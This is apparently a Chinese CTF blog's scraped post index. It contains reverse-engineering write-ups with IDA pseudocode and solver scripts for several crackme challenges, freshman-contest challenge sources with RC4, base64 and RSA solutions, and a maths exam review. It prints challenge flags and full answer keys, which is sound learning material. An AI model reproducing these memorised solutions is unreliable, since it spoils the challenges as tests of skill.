#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;algorithm&gt;#include&lt;vector&gt;#include&lt;iostream&gt;#include&lt;map&gt;#include&lt;time.h&gt;#include&lt;queue&gt;#include \"windows.h\"using namespace std;unsigned char str[] =&#123; 0x61, 0x6A, 0x79, 0x67, 0x6B, 0x46, 0x6D, 0x2E, 0x7F, 0x5F, 0x7E, 0x2D, 0x53, 0x56, 0x7B, 0x38, 0x6D, 0x4C, 0x6E, 0x00&#125;;int main()&#123; str[18]^=0x13u; int v3; for(int i=17;i&gt;=0;i--) &#123; v3 = i ^ str[i]; if(i%2) str[i] = v3 + i; else str[i+2] = v3; &#125; printf(\"%s\\n\",str); return 0;&#125; easyre-153查看分析是32位elf文件，有壳 放到kali下进行脱壳 ida静态分析 pipe是完成两个进程之间通信的函数 1是写，0是读 fork是通过系统调用创建一个“子进程”的函数 fork的返回值，在子进程里面是0，在父进程里是子进程的进程id 所以我们可以很容易看出来 在子进程里面，由于v5==0，所以会输出刚刚我们看到的 OMG!!!! I forgot kid’s id 然后将69800876143568214356928753通过pipe传给父进程 完成这个任务后，子进程就会exit（0） 至于父进程，由于v5！=0，会跳过子进程刚刚执行的部分，直接读取子进程传给他的那一串数字 并且读取用户输入的v6 如果v6==v5 那么就会继续进行下面的操作 也就是说程序会创建一个管道，然后开启一个子进程进行进程间通信。子进程将 69800876143568214356928753 发送给父进程。父进程要求用户输入一个整数，并且等于子进程的 pid 。后面就会对发送过来的数据进行解码成 flag 输出来。 我们进入lol函数 再看流程图 原来输出解码后的数据的那部分代码被作者改掉了，永远也不会执行。解码的操作也不复杂，直接用pthon脚本吧。 guo='69800876143568214356928753'flag=''flag=chr(2*ord(guo[1]))flag+=chr(ord(guo[4])+ord(guo[5]))flag+=chr(ord(guo[8])+ord(guo[9]))flag+=chr(ord(guo[12])*2)flag+=chr(ord(guo[17])+ord(guo[18]))flag+=chr(ord(guo[10])+ord(guo[21]))flag+=chr(ord(guo[9])+ord(guo[25]))print ('RCTF&#123;'+flag+'&#125;') IgniteMe32位文件，无壳 拖入ida中查看，逻辑不太难，这里面我加了很多注释方便读懂程序。 里面有一个很关键的函数sub_4011C0()，函数结构如下： EXP import stringcipher=r'GONDPHyGjPEKruv&#123;&#123;pj]X@rF'k=[0xd,0x13,0x17,0x11,0x2,0x1,0x20,0x1d,0xc,0x2,0x19,0x2f,0x17,0x2b,0x24,0x1f,0x1e,0x16,0x9,0xf,0x15,0x27,0x13,0x26,0xa,0x2f,0x1e,0x1a,0x2d,0xc,0x22,0x4]ch=''flag=''i=0for i in range(len(cipher)): for c in string.printable: if c&gt;='a' and c&lt;='z': ch=chr(ord(c)-32) else: if c&gt;='A' and c&lt;='Z': ch=chr(ord(c)+32) else: ch=c ch=chr(k[i]^((ord(ch)^0x55)+72)) if ch==cipher[i]: flag+=c breakprint ('EIS&#123;'+flag+'&#125;') 不过我个人还是喜欢写C语言的，这里也贴一下C语言代码 #include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123;char a[]=&#123;0x0D, 0x13, 0x17, 0x11, 0x2, 0x1, 0x20, 0x1D, 0x0C, 0x2, 0x19, 0x2F, 0x17, 0x2B, 0x24, 0x1F, 0x1E, 0x16, 0x9, 0x0F, 0x15, 0x27, 0x13, 0x26, 0x0A, 0x2F, 0x1E, 0x1A, 0x2D, 0x0C, 0x22,0x4&#125;;char b[]=\"GONDPHyGjPEKruv&#123;&#123;pj]X@rF\";int i;char j;for(i=0;i&lt;24;i++)&#123;for(j=0X0;j&lt;0X7f;j++)&#123;if(b[i]==(a[i]^((j^0x55)+0x48)))&#123;if (0x40&lt;j&amp;&amp;j&lt;0x5B)j+=0x20;else if(0x60&lt;j&amp;&amp;j&lt;0x5B)j-=20;printf(\"%c\",j);&#125;&#125;&#125;printf(\"\\n\");return 0;&#125; 这里新学了一个ida小知识，数据可以用快捷键shift+E，在hex-view窗口里提取数据（这样就不用跟我一样一个一个输了）。 reverse-for-the-holy-grail-35064位elf文件，拖入ida静态调试 查看主函数 int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // ebx int v4; // ebx __int64 v5; // rbx void *v7; // [rsp+0h] [rbp-70h] __int64 v8; // [rsp+10h] [rbp-60h] void *v9; // [rsp+20h] [rbp-50h] __int64 v10; // [rsp+30h] [rbp-40h] void *v11; // [rsp+40h] [rbp-30h] __int64 v12; // [rsp+48h] [rbp-28h] char v13; // [rsp+50h] [rbp-20h] v11 = &amp;v13; v12 = 0LL; v13 = 0; std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"What... is your name?\", 21LL); std::endl&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout); std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v11); std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"What... is your quest?\", 22LL); std::endl&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout); std::istream::ignore((std::istream *)&amp;std::cin); std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;((__int64)&amp;std::cin, (__int64)&amp;v11); std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"What... is the secret password?\", 32LL); std::endl&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout); std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;userIn); v7 = &amp;v8; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::_M_construct&lt;char *&gt;( (__int64 *)&amp;v7, (_BYTE *)userIn, (_BYTE *)(qword_601AE8 + userIn)); v3 = validChars((__int64 *)&amp;v7); if ( v7 != &amp;v8 ) operator delete(v7); if ( v3 &lt; 0 ) goto LABEL_14; v9 = &amp;v10; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::_M_construct&lt;char *&gt;( (__int64 *)&amp;v9, (_BYTE *)userIn, (_BYTE *)(qword_601AE8 + userIn)); v4 = stringMod((__int64 *)&amp;v9); //stringMod是我们解出此题的关键 if ( v9 != &amp;v10 ) //这里是关键函数 operator delete(v9); if ( v4 &lt; 0 ) &#123;LABEL_14: std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Auuuuuuuugh\", 11LL); std::endl&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout); &#125; else &#123; std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Go on. Off you go. tuctf&#123;\", 25LL); v5 = std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, userIn, qword_601AE8); std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(v5, \"&#125;\", 1LL); std::endl&lt;char,std::char_traits&lt;char&gt;&gt;(v5); &#125; if ( v11 != &amp;v13 ) operator delete(v11); return 0;&#125; 加密还有 check 函数 全部都在stringMod 这个函数里面 __int64 __fastcall stringMod(__int64 *a1)&#123; __int64 length; // r9 char *c_str; // r10 __int64 i; // rcx signed int v4; // er8 int *temp_2; // rdi int *temp_3; // rsi signed int t; // ecx signed int j; // er9 int index; // er10 unsigned int tmp; // eax int sign; // esi int v12; // esi int temp[24]; // [rsp+0h] [rbp-60h] memset(temp, 0, 0x48uLL); length = a1[1]; if ( length ) &#123; c_str = (char *)*a1; i = 0LL; v4 = 0; do &#123; v12 = c_str[i]; temp[i] = v12; if ( 3 * ((unsigned int)i / 3) == (_DWORD)i &amp;&amp; v12 != firstchar[(unsigned int)i / 3] )// 当i是3的倍数时，str=first[i/3] // &#123; 65, 105, 110, 69, 111, 97&#125; v4 = -1; ++i; &#125; while ( i != length ); &#125; else &#123; v4 = 0; &#125; temp_2 = temp; temp_3 = temp; t = 666; do &#123; *temp_3 = t ^ *(unsigned __int8 *)temp_3; t += t % 5; ++temp_3; &#125; while ( &amp;temp[18] != temp_3 ); // 异或操作 j = 1; index = 0; tmp = 1; sign = 0; do // 0,1,2 每三个数验证 &#123; if ( sign == 2 ) &#123; if ( *temp_2 != thirdchar[index] ) // &#123; 751, 708, 732, 711, 734, 764, 0, 0 &#125; // temp[2]= v4 = -1; if ( tmp % *temp_2 != masterArray[index] )// &#123; 471, 12, 580, 606, 147, 108 &#125; // // temp[0]*temp[1]%temp[2]= v4 = -1; ++index; tmp = 1; sign = 0; &#125; else // sign 0,1, &#123; tmp *= *temp_2; // 0 tmp=temp[0] // 1 tmp=temp[0]*temp[1] if ( ++sign == 3 ) sign = 0; &#125; ++j; ++temp_2; &#125; while ( j != 19 ); // 18循环 return (unsigned int)(t * v4);&#125; stringMod函数校验过程一共分为三部分，第一部分中需要值得注意的是：v3是int型，除以一个数后小数部分会被去掉，所以3 * ((unsigned int)v3 / 3) == (_DWORD)v3成立的条件是v3是3的倍数，因此flag的第 3*n 个字符对应firstchar的六个字符 脚本 i = 666num = [] # v7flag = 'A**i**n**E**o**a**' # flag第0+3*n位对应firstcharXorflag = [] # flag每位与v7异或的结果thirdchar = [0x2ef, 0x2c4, 0x2dc, 0x2c7, 0x2de, 0x2fc]masterarray = [0x1d7, 0xc, 0x244, 0x25e, 0x93, 0x6c]for j in range(18): # 求v7 num.append(i) i += (i % 5)temp_num = 0for i in range(2, len(flag)+1, 3): # 求flag 第 1+3*n位 temp = thirdchar[temp_num] ^ num[i] temp_num += 1 flag = flag[:i] + chr(temp) + flag[i+1:]temp_num = 0for i in range(len(flag)): # flag每位与v7异或 temp = ord(flag[i]) ^ num[i] Xorflag.append(temp)for i in range(1, 19, 3): # 求flag第1+3*n位 for j in range(32, 128): j ^= num[i] temp = j * Xorflag[i-1] % Xorflag[i+1] if temp == masterarray[temp_num]: flag = flag[:i] + chr(j ^ num[i]) + flag[i+1:] temp_num += 1 breakprint(\"tuctf&#123;\" + flag + '&#125;') EasyRE不知道逆向题做到什么时候能有突破，不知道未来的方向在哪里，不知道我未来靠这个能做些什么，不知道自己何时能变得更强，眼下学了一年得逆向还在这做EasyRE，可笑可笑！ 32位文件，无壳直接用IDA打开 Shift+F12查看字符串窗口，发现flag，但是并不对。注意到下面的right\\n，是start函数，查看其伪代码。 signed int __usercall start@&lt;eax&gt;(int a1@&lt;ebp&gt;, int a2@&lt;esi&gt;)&#123; char v2; // bl signed int result; // eax int v4; // ST14_4 _DWORD *v5; // eax _DWORD *v6; // esi _DWORD *v7; // eax _DWORD *v8; // esi int v9; // edi int v10; // esi _DWORD *v11; // eax int v12; // et1 sub_4017C7(); if ( !(unsigned __int8)sub_40157C(1) || (v2 = 0, *(_BYTE *)(a1 - 25) = 0, *(_DWORD *)(a1 - 4) = 0, *(_BYTE *)(a1 - 36) = sub_40154A(), dword_403334 == 1) ) &#123; sub_401885(7); goto LABEL_20; &#125; if ( dword_403334 ) &#123; v2 = 1; *(_BYTE *)(a1 - 25) = 1; &#125; else &#123; dword_403334 = 1; if ( initterm_e(&amp;unk_4020D4, &amp;unk_4020E0) ) &#123; *(_DWORD *)(a1 - 4) = -2; result = 255; goto LABEL_18; &#125; initterm(&amp;unk_4020C8, &amp;unk_4020D0); dword_403334 = 2; &#125; sub_4016E5(*(_DWORD *)(a1 - 36)); v5 = (_DWORD *)sub_401879(v4); v6 = v5; if ( *v5 &amp;&amp; (unsigned __int8)sub_401651(v5) ) ((void (__thiscall *)(_DWORD, _DWORD, signed int, _DWORD))*v6)(*v6, 0, 2, 0); v7 = (_DWORD *)sub_40187F(); v8 = v7; if ( *v7 &amp;&amp; (unsigned __int8)sub_401651(v7) ) register_thread_local_exe_atexit_callback(*v8); v9 = get_initial_narrow_environment(); v10 = *(_DWORD *)_p___argv(); v11 = (_DWORD *)_p___argc(); a2 = sub_401080(*v11, v10, v9); if ( !(unsigned __int8)sub_4019A4() )LABEL_20: exit(a2); if ( !v2 ) cexit(); sub_401702(1, 0); *(_DWORD *)(a1 - 4) = -2; result = a2;LABEL_18: v12 = *(_DWORD *)(a1 - 16); return result;&#125; 先拖进IDA 里看看吧！找到之前命令行中的提示字符串 input ，找到交叉引用该字符串的地方为函数sub_401080。（在查看strings windows的时候眼前一亮发现有个 flag{NP2NiaNXx1ClGYVQ50} ，但是输入以后发现并不是真正的flag… F5查看函数sub_401080的伪代码。字符串 input 的地址为0x402150，结合代码，可以判断sub_401020函数为printf函数。再往下发现地址0x402158开始的字符串为%s，说明sub_401050应该是scanf函数，将用户输入保存到v7中。 得到输入以后，对v7的长度进行检查，从代码中可知v7长度必须为24个字符。 接下来以 v8地址+7 位置处的字符赋值给v2，根据IDA的分析提示，v7的起始地址为ebp-24h(ebp-36)， v8的起始地址为ebp-14h(ebp-20)。假设我输入的是abcdefghijklmnopqrstuvwx ，那么在栈中应该是下面的情况。也就是v2的初始值是用户输入的最后一个字符x。 高地址 ebp-13 x | ebp-14 w | … … | ebp-20 q | … … ↓ ebp-35 b 低地址 ebp-36 a 每次循环中通过v1控制对用户输入字符串的遍历，将v2的值赋值给v3，然后v2地址自减1，也就是逆序取下一个字符。将v3保存的当前字符赋值给数组 byte_40336C[v1]。所以这个部分其实就是逆序提取用户输入，保存到数组byte_40336C的过程。 接下来对数组byte_40336C的每个值x进行 (x+1)^6的操作。 最后将数组byte_40336C，也就是一个字符串，与地址0x402124开始的字符串进行比较。如果相同，即strcmp返回值为0，则调用printf函数输出 right\\n 双击unk_402124，选中24个字符，按下 Shift + E 提取，选择 string literal ，得到的字符串为： xIrCj~&lt;r|2tWsv3PtI\\x7Fzndka 。 至此，整个程序的逻辑很清楚了： 在第1个部分中，读取用户输入 在第2部分中，判断用户输入的长度。逆序提取用户输入，保存到数组中（其实是个字符串） 在第3部分中，对数组每个值x进行 (x+1)^6的操作 在第4部分中，检查得到的数组（字符串）与xIrCj~&lt;r|2tWsv3PtI\\x7Fzndka 是否相等，相等则成功解决。 用python写脚本逆出正确的输入 flag{xNqU4otPq3ys9wkDsN}： # user_input逆序，存到arr数组中# arr中的每个字符，进行 (i+1)^6 的操作# 将arr与target比较，相同的时候输出\"right\"target='xIrCj~&lt;r|2tWsv3PtI\\x7Fzndka'res = \"\"for i in target: tmp = (ord(i) ^ 6) - 1 # 异或的优先级！！ tmp_char = chr(tmp) # print(\"tmp:&#123;&#125;, tmp_char:&#123;&#125;\".format(tmp, tmp_char)) res += tmp_char res = res[::-1] #逆序print(res) # flag&#123;xNqU4otPq3ys9wkDsN&#125; 编写脚本的过程中有两个需要注意的： 1.异或运算的逆运算还是异或，比如： x = 5y = x^6 # 3, 0b101 ^ 0b110 =&gt; 0b011# 已知y，求xx = y^6 # 0b011 ^ 0b110 =&gt; 0b101 2.异或运算的优先级是低于减号的： 5^6 -1 # =&gt; 0(5^6) -1 # =&gt;2","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"菜鸡的新生赛出题","slug":"菜鸡的新生赛出题","date":"2020-11-30T09:45:53.263Z","updated":"2021-01-03T09:59:36.746Z","comments":true,"path":"2020/11/30/菜鸡的新生赛出题/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/30/%E8%8F%9C%E9%B8%A1%E7%9A%84%E6%96%B0%E7%94%9F%E8%B5%9B%E5%87%BA%E9%A2%98/","excerpt":"我是真的菜啊！！！","text":"我是真的菜啊！！！ 0x01 前言这次出题大概忙了差不多有半个月吧，从只会做题不会出题，到会写简单题的源代码，到会写一些有难度的题的源码，还是学到了一些东西的。 0x02 RE签到题目描述今天hnqj又不想学习了，于是他决定出道签到题给大家玩玩，懂得都懂，不懂得说了也有用。很快啊，hnqj出好了，来偷袭吧干题人！ 源码#include&lt;stdio.h&gt;#include&lt;string.h&gt;const char a[]=\"&#123;opzfpzfzvzvfohyk\";int main()&#123; int i =0; char s[50]=&#123;&#125;; strcpy(s, \"abcdefghijklmnjlkj\"); for ( i = 0; i &lt; strlen(s); ++i ) s[i] += 7; puts(s); return 0; &#125; 每个字符减七，多的不想说毕竟签到 真签到就随便写了个程序，动调只要会下断点就能得到答案 在return 0下个断点，md5得到flag 逆向也就这么难了这道题是因为我看着比赛已经打了一天了，也没几只队伍做出前两道签到题，这跟预想的不太一样啊，真心想鼓励学弟们多入坑嘿嘿嘿！ shift+f12 就是flag maze参考攻防世界新手区逆向最后一题，基本是一个类型的题目，不多说。 try题目来自海里师傅，只有一行代码，但是还挺脑洞的 import zlib,base64,marshalprint(base64.b64decode(zlib.decompress(base64.b64decode(b'eJydUjlywzAM/JJkpnVBU5pMCkBDyipcu9DQeYBMvT64aEuOm6TALLE4uACJ52mGPpr1M3T+xb5nvMU5TtOM04UQdvF0hjc1f7XrzseXOK4w44s21iQ49Ru/N783/8t8whvN2YFhNPTz0IHkV8Su9iWkHlo/WX7tczG8HnD0CwQvSHYf1P+AQjgaXxQf/u+8Bvb+ikX8NjKfvQOusXsqEl/zF6g6AmHxLWh94XuIc9TnTlwh3Fqb8r857Uka2VBnaGIxzHJuMaslzuFc6kUxl/TcYDj1UbU3aVS9w6gc8jzZH6jPQXZXLJfOkDdn40mDo51IbpJ83pPlFe2DEnvWDps4G+3WPXqTn7L2rDrljqDcoPc4ip3sPZlfaD4+V3vDnT55d4l3VvzK+5VdcW/V6OTNi/Ab3aqHd0LIsQaD5XMex4JpDhIXrYPsyJc0Vl9noVlX7p20hv+O43vsvjU9/9VzFvpXcc8t8uey4fjAOygWjkE8Hn8AFflf5g=='))))-------------------------------------------------------------------------------------------------#得到得数放入十六进制编译器里，后缀改为pyc，再转为py得flag = '****_****_****_****'b = 'PUALAKLVV]TQ[&#125;QD'c = ''for i in range(len(flag)): c += chr(ord(flag[i]) ^ ord(b[i]))else: print(c)------------------------------------------------------------------------------------------------flag=''b = 'PUALAKLVV]TQ[&#125;QD'c = 'cd2512d512d5123e'for i in range(len(c)): flag += chr(ord(c[i]) ^ ord(b[i]))else: print(flag)再按位加上'_'得31sy_py(c_go0d_jOb! easy_cpphl师傅写的源码比我强多了，这里就不放源码了，简单给一下exp import base64flag=''; base64flag = ''; dict = &#123;&#125;;orgin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'for i in range(len(orgin)): dict[orgin[i]] = orgin[i]for i in range(6, 15): dict[orgin[i]] , dict[orgin[i+10]] = dict[orgin[i+10]] , dict[orgin[i]] # 恢复base64密钥表print(dict)secret = 'ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9'for i in range(len(secret)): base64flag += dict[secret[i]]#根据恢复后的base64密钥表进行部分字符转化，想当于G~O的字符转为Q~Y,Q~Y转为G~Oprint(base64flag)#base64解码flag = base64.b64decode(base64flag)print(flag)#恢复base64密钥表相当于以下算法secret1 = 'ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9'a=''for i in range(len(secret1)): if ord(secret1[i])&lt;80 and ord(secret1[i])&gt;=71: a += chr(ord(secret1[i]) + 10) else: if ord(secret1[i])&lt;90 and ord(secret1[i])&gt;=81: a += chr(ord(secret1[i]) - 10) else: a += chr(ord(secret1[i]))print(a) 大三才学的密码学这道题，在上一篇博客有详细题解，可以参考。 0x03 密码最最最基础密码仿射密码，澳神直接手算！ Rsafrom Crypto.Util.number import *from gmpy2 import *from sympy.ntheory.residue_ntheory import nthroot_modn = 7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409d = 7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440cipher = 1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200p = 102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393q = 7534810196420932552168708937019691994681052660068275906973480617604535381306041583841106383688654426129050931519275383386503174076258645141589911492908993r = 10269028767754306217563721664976261924407940883784193817786660413744866184645984238866463711873380072803747092361041245422348883639933712733051005791543841phn = (p-1)*(q-1)*(r-1)e = 0x10001dec = invert(e,phn)print(dec)c = pow(cipher,dec,n)print(c)m = nthroot_mod(c,2,r)print(m)print(long_to_bytes(m)) 维吉尼亚维吉尼亚源码，懂得都懂，密码我也不太会出，也没怎么专研，就这样吧！ 0x04 总结没啥好说的，觉得自己还是太菜了，源码就只放给大家一道吧，有的学弟水平应该已经远高于我。自己还是的多学多练啊，另外老师说大三也不能一直打比赛做题了，最近准备搞一搞实战了奥里给！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"新生赛出题","slug":"新生赛出题","date":"2020-11-29T08:23:43.921Z","updated":"2020-11-30T09:46:13.263Z","comments":true,"path":"2020/11/29/新生赛出题/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/29/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%87%BA%E9%A2%98/","excerpt":"最近太忙，自己出题的wp也没写，基本上从周四开始到周日现在没睡过一会觉，刚回宿舍，赶紧给学弟们写写wp吧！","text":"最近太忙，自己出题的wp也没写，基本上从周四开始到周日现在没睡过一会觉，刚回宿舍，赶紧给学弟们写写wp吧！ 大三才学的密码学题目描述hnqj今天密码学课上又在timi了，老师几次下来巡视看看hnqj到底在干嘛！很快啊，当老师走到他面前的那一刻，他翻开了密码学课本，嗖的一下，他撇见了一种叫***的加密，于是hnqj嘿嘿一笑…… 分析首先进入ida中进行分析，这里有几个函数我们看一下 首先进入函数sub_401760，函数里面就是两个简单的for循环。这个函数的内容与RC4初始化的内容比较相似，所以可以将这个函数命名为RC4_INIT 这里给出有关RC4初始化及加密代码的博客，仅供参考https://www.cnblogs.com/zibility/p/5404478.html 继续继续分析sub_40188D，如果对RC4算法了解的话这里其实就是一个RC4加密，但是在异或的地方有一些不同，数据偏移加了24 最后我们来分析函数sub_401530,立马能注意到一串比较可疑的字符。 凭经验来看这是一串base64编码。而这个算法其实就是一个类似base64的编码运算。而那个字符串就是就是base64的码表，只是变异的。至于和真正的base64区别在于sub_401711这个函数将码表进行了偏移—向左循环24位 通过对每个函数进行分析之后再来看主函数的逻辑就很清楚了。 程序首先对输入进行变种rc4加密,然后通过变种的base64进行编码,将结果与密文B4QrGVzkpZVeHssap5HEgWfSQQ0zmMAA进行比较 EXP#coding:utf-8import redef RC4_INIT(key): key=list(key) for i in range(len(key)): key[i]=ord(key[i]) k=[0 for i in range(256)] s=[0 for i in range(256)] j=0 length=len(key) for i in range(256): s[i]=i k[i]=key[i % length] for i in range(256): j=(j + s[i] + k[i])%256 s[i],s[j]=s[j],s[i] return sdef RC4_DECRYPTE(Data,key): Data=list(Data) for i in range(len(Data)): Data[i]=ord(Data[i]) s=RC4_INIT(key) i=j=t=0 length=len(Data) for k in range(length): i = (i+1)%256 j=(j + s[i])%256 s[i],s[j]=s[j],s[i] t=(s[i]+s[j]+24)%256#不同于正常RC4 Data[k]=Data[k]^s[t] return Datadef base64_encode(s, dictionary): r = \"\" p = \"\" c = len(s) % 3 if (c &gt; 0): for i in range(c, 3): p += '=' s += \"\\0\" for c in range(0, len(s), 3): n = (ord(s[c]) &lt;&lt; 16) + (ord(s[c+1]) &lt;&lt; 8) + (ord(s[c+2])) n = [(n &gt;&gt; 18) &amp; 0x3F, (n &gt;&gt; 12) &amp; 0x3F, (n &gt;&gt; 6) &amp; 0x3F, n &amp; 0x3F] r += dictionary[n[0]] + dictionary[n[1]] + dictionary[n[2]] + dictionary[n[3]] return r[0:len(r) - len(p)] + pdef base64_decode(s, dictionary): base64inv = &#123;&#125; for i in range(len(dictionary)): base64inv[dictionary[i]] = i s = s.replace(\"\\n\", \"\") if not re.match(r\"^([&#123;alphabet&#125;]&#123;&#123;4&#125;&#125;)*([&#123;alphabet&#125;]&#123;&#123;3&#125;&#125;=|[&#123;alphabet&#125;]&#123;&#123;2&#125;&#125;==)?$\".format(alphabet = dictionary), s): raise ValueError(\"Invalid input: &#123;&#125;\".format(s)) if len(s) == 0: return \"\" p = \"\" if (s[-1] != \"=\") else \"AA\" if (len(s) &gt; 1 and s[-2] == \"=\") else \"A\" r = \"\" s = s[0:len(s) - len(p)] + p for c in range(0, len(s), 4): n = (base64inv[s[c]] &lt;&lt; 18) + (base64inv[s[c+1]] &lt;&lt; 12) + (base64inv[s[c+2]] &lt;&lt; 6) + base64inv[s[c+3]] r += chr((n &gt;&gt; 16) &amp; 255) + chr((n &gt;&gt; 8) &amp; 255) + chr(n &amp; 255) return r[0:len(r) - len(p)]def test_base64(): import base64 import string import random dictionary = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" def random_string(length): return ''.join(random.choice(string.ascii_letters) for m in range(length)) for i in range(100): s = random_string(i) encoded = base64_encode(s, dictionary) assert(encoded == base64.b64encode(s)) assert(s == base64_decode(encoded, dictionary))if __name__ == \"__main__\": dictionary = 'Mq/J0tTI1RkSimKFwnczo2VXpPshL4_UgjH6DEG39yr+aOYWCfBeN5lb8v7QdxZuA'#向左平移后的码表 Data=base64_decode(\"B4QrGVzkpZVeHssap5HEgWfSQQ0zmMAA\", dictionary) key='Please input the flag:\\n' flag=RC4_DECRYPTE(Data,key) for i in flag: print(chr(i),end='') print() 总结更多相关出题信息将在最近几天上传到博客https://gha01un.github.io/ 欢迎各位大佬踩踩！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"信息安全数学基础复习总结","slug":"信息安全数学基础复习总结","date":"2020-11-25T10:20:42.845Z","updated":"2020-11-25T10:28:36.071Z","comments":true,"path":"2020/11/25/信息安全数学基础复习总结/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/25/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"学不动了学不动了，压抑一周了已经，心情也不好，每天水水博客找点存在感吧，呜呜呜好难过啊","text":"学不动了学不动了，压抑一周了已经，心情也不好，每天水水博客找点存在感吧，呜呜呜好难过啊 第1章 整数知识点： 1.整除的概念及性质 2.欧几里得除法 3.素数的平凡判别 4.b进制，会进制转换 5.最大公因数定义及相关性质 6.广义欧几里得除法计算最大公因数 7.最小公倍数计算及相关性质 8.算术基本定理的应用，会45页的定理1.6.4 要考题型： 1.证明整除性（法一，利用整除性质；法二，利用同余性质） 2.素数相关证明及判断 3.求最大公因数（欧几里得除法） 4.求s，t使得sa+tb=1（代入法或者列表法） 5.整数的表示 第2章 同余知识点： 1.同余的概念、性质及判断 2.剩余类、完全剩余系、简化剩余类、简化剩余系的概念及区别，能写出一个具体数的以上几种类型数字 3.两个模、多个模的完全剩余系和简化剩余系的性质 4.欧拉定理、费马定理、Wilson定理 5.模重复平方计算法（老师说，不一定按这个步骤来，但要会算出a模m和谁同余，a、m是具体的数字，结果要算对） 要考题型： 1.剩余类、系的概念，很有可能是给出一个具体数字，让你写出剩余类、完全剩余系、简化剩余类、简化剩余系 2.求模幂，就是一个数a的p次方模m和谁同余，用好欧拉定理 3.可以用同余性质去证明整除 4.同余性质的证明 5.对于ap mod m，m很大的时候，想要求同余，可以将同余式转为同余式组，分别计算出结果，再用中国剩余定理求解 第3章 同余式知识点即考点： 1.一次同余式求解 2.二次同余式求解（用中国剩余定理） 3.高次同余式的求解 4.高次同余式的提升（模数为mn形式） 5.素数模的同余式化简 6.素数模的同余式解数估计 第4章 二次剩余知识点： 1.模为奇素数的平方剩余与平方非剩余概念 2.勒让德符号定义及相关计算的性质 3.二次互反律 4.雅克比符号（不再限定模数必须为奇素数，见到一个二次同余式，就可直接用勒让德符号的计算性质包含二次互反律，来判断同余式是否有解。但是要判断同余式具体的解数时，还是要将同余式拆为模数为奇数的同余式组，解数为各个同余式解数的乘积） 要考题型： 1.求二次剩余 2.判断是否是二次剩余，二次同余式是否有解 3.求椭圆曲线上的所有点 4.判断二次同余式的解数 5.求满足（a/p）的所有p 第5章 原根与指标知识点： 1.指数定义与性质 2.原根定义与性质 3.指标定义与性质 要考题型： 1.求指数（可能要利用指数性质） 2.求原根 ①模p原根 ②模p2原根 ③模pα原根 ④模2pα原根 上面这几个是层层递进的，从①到④逐个求解 3.求指标 4.利用指标来求高次同余式，例题在195页的例5.3.6，先判断是否有解，再利用指标表（考试会给出）求解。 第6章 素性检验知识点： 1.伪素数定义（再附加个Carmicheal数） 2.欧拉伪素数定义 3.强伪素数定义 要考题型： 1.给一个数，利用定义判断它是不是相应的伪素数 